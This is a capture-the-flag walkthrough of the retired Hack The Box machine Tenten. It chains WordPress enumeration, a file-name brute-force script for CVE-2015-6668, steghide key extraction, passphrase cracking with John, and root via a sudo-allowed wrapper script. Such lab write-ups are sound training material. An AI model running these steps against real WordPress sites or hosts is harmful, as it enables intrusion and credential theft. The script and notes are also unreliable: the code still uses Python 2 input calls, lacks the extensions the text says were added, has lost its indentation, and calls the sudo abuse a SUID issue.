# ⭐Tenten - Hack The Box Write-up ⭐
![HTB](https://img.shields.io/badge/HTB-Retired-green)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Category](https://img.shields.io/badge/Category-CTF-red)

## 📋 Machine Info

| Property | Value |
|----------|-------|
| **Difficulty** | Medium |
| **OS** | Linux (Ubuntu) |
| **IP** | 10.10.10.10 |
| **Category** | CTF / Retired Machine |
| **Tags** | WordPress, CVE-2015-6668, Steganography, SSH Key, Privilege Escalation, SUID |

---
## Overview

This writeup covers the exploitation of the retired Hack The Box machine **Tenten**, which demonstrates WordPress plugin vulnerabilities, steganography techniques, and Linux privilege escalation through misconfigured SUID binaries.

**Key Steps:**
* WordPress enumeration and plugin discovery
* Exploiting CVE-2015-6668 (Job Manager file disclosure)
* Steganography analysis to extract SSH keys
* SSH key cracking with John the Ripper
* Privilege escalation via SUID binary abuse
---
## Enumeration

### Port Scan (Nmap)

```bash
sudo nmap -sS -Pn -T4 --min-rate=1000 -p 22,80,443,8080,3306 10.10.10.10
```

**Open Ports:**
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
```

### Hostname Resolution

The site redirected to `tenten.htb`. To access it locally, add the following to `/etc/hosts`:

```bash
echo "10.10.10.10 tenten.htb" | sudo tee -a /etc/hosts
```
---

## Web Reconnaissance

**Initial Analysis:**
* **CMS:** WordPress installation detected
* **Technology Stack:** PHP, Apache/nginx

**WordPress Enumeration with WPScan:**

```bash
# Enumerate users
wpscan --url http://tenten.htb/ -e u --disable-tls-checks

# Enumerate plugins aggressively
wpscan --url http://tenten.htb/ -e ap --plugins-detection aggressive --api-token YOUR_TOKEN
```

**Key Findings:**
* **Username discovered:** `takis`
* **Vulnerable plugin:** `job-manager` version `0.7.25`
* **CVE:** CVE-2015-6668 (File disclosure vulnerability)
---
## Initial Foothold

### CVE-2015-6668 Exploitation

The Job Manager plugin version 0.7.25 is vulnerable to a file disclosure attack that allows reading arbitrary files from the server.

**Vulnerability Details:**
* **CVE ID:** CVE-2015-6668
* **Description:** CV filename disclosure on Job-Manager WP Plugin
* **Affected Version:** 0.7.25

### File Discovery Script

The **Job Manager** WordPress plugin allows reading arbitrary files through predictable upload paths. While researching this plugin, I discovered that it is possible to brute-force file names and paths to enumerate uploaded files.

I used an exploit script originally shared on [vagmour.eu](https://vagmour.eu) (accessed via the Wayback Machine). The script was written in Python 2, so I made a few modifications to make it compatible with **Python 3**. I also updated the date range in the `for` loop to match the post dates on `tenten.htb`, as they were outside the original script’s range. Additionally, I included image extensions (e.g., `.png`, `.jpg`) and `.zip` in the list of file types to increase the chance of finding interesting content.


exploit.py

import requests

print("""
CVE-2015-6668
Title: CV filename disclosure on Job-Manager WP Plugin
Author: Evangelos Mourikis
Versions: <=0.7.25
""")

website = raw_input('Enter a vulnerable website: ')
filename = raw_input('Enter a file name: ')

filename2 = filename.replace(" ", "-")

for year in range(2017, 2023):
for i in range(1, 13):
for extension in {'doc', 'pdf', 'docx'}:
URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02}".format(i) + "/" + filename2 + "." + extension
req = requests.get(URL)
if req.status_code == 200:
print("[+] URL of CV found! " + URL)

We give the script execution permissions:

```bash
chmod +x exploit.py
done

Then, we run it using:

```python3 exploit.py
The script will prompt for the target website URL and the name of the file to search for.

We found the file name by running a Bash script that performs iterative requests using `curl`.

### Bash Script to Search for Uploaded Files

```bash
for i in $(seq 1 20); do
  echo -n "$i: ";
  curl -sL http://tenten.htb/index.php/jobs/apply/$i/ | grep '<title>';
done

File Found
File name: HackerAccessGranted.jpg

Discovered on page: 13

We run the exploit script again, this time using the file name `HackerAccessGranted` along with the website URL.

The script successfully finds the file, and when we open the resulting URL, we get the following image:

**Found:**  
`/wp-content/uploads/2017/04/HackerAccessGranted.jpg`



**Key Discovery:**
* Found application: `HackerAccessGranted`
* File location: `/wp-content/uploads/2017/04/HackerAccessGranted.jpg`

---
## Steganography Analysis

### File Extraction

Downloaded and analyzed the suspicious image file:

```bash
# Download the file
wget http://tenten.htb/wp-content/uploads/2017/04/HackerAccessGranted.jpg

# Using the `info` parameter from `steghide`, we discover that the image contains a hidden RSA private key.

To extract the hidden data using steghide, we use the following command:

# Extract 
steghide extract -sf HackerAccessGranted.jpg
```

**Result:** Extracted an SSH private key (`id_rsa`)

### SSH Key Analysis

```bash
# Check the extracted key
cat id_rsa
# Key is encrypted and requires a passphrase
```
---
## Credential Cracking

### SSH Key Cracking with John the Ripper

```bash
# Convert SSH key to John format
/usr/share/john/ssh2john.py id_rsa > id_rsa.hash

# Crack the passphrase
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

**Cracked Password:** `superpassword`
---
## SSH Access

Using the recovered password, we can connect via SSH.  
We authenticate with the `id_rsa` private key (whose passphrase we decrypted earlier) and the user `takis`.

```bash
# Set proper permissions
chmod 600 id_rsa

# SSH login as takis
ssh -i id_rsa takis@tenten.htb
# Enter passphrase: superpassword
```

**Fix terminal issues:**
```bash
export TERM=xterm
```
---
## Privilege Escalation

### Enumeration

```bash
# Check user groups
id
# takis is member of lxd group (potential vector)

# Check sudo privileges
sudo -l
```

**Key Finding:**
```
User takis may run the following commands on tenten:
    (ALL : ALL) NOPASSWD: /bin/fuckin
```

### SUID Binary Analysis

```bash
# Examine the binary
ls -la /bin/fuckin
cat /bin/fuckin
```

**Binary Content:**
```bash
#!/bin/bash
$1
```

The binary simply executes the first argument passed to it.

### Root Exploitation

Since we can run `/bin/fuckin` as root without a password, and it executes any command passed as an argument:

```bash
# Execute bash as root
sudo /bin/fuckin bash
```

**Result:** Root shell obtained!
---
## 🏁 Flags

* **User Flag:** Located in `/home/takis/user.txt`
* **Root Flag:** Located in `/root/root.txt`

## Tools Used

| Category | Tools |
|----------|-------|
| **Reconnaissance** | nmap, wpscan, curl, whatweb |
| **Exploitation** | Custom Python script, steghide |
| **Credential Cracking** | john, ssh2john |
| **Post-Exploitation** | ssh, sudo |
---
## Key Takeaways

* WordPress plugin vulnerabilities can lead to file disclosure attacks
* Steganography is commonly used to hide sensitive data in CTF environments
* Always enumerate sudo privileges thoroughly during privilege escalation
* Misconfigured SUID binaries can provide direct paths to root access
* File upload functionalities in web applications should be properly secured
---
## ⚠️ Disclaimer

> **This writeup is for educational purposes only.**
> 
> Do not use these techniques on systems you do not own or have permission to test.
> 
> In accordance with the Hack The Box Terms of Service, this writeup covers only retired HTB machines. Publishing writeups of active machines is a violation of their rules and may lead to account suspension.
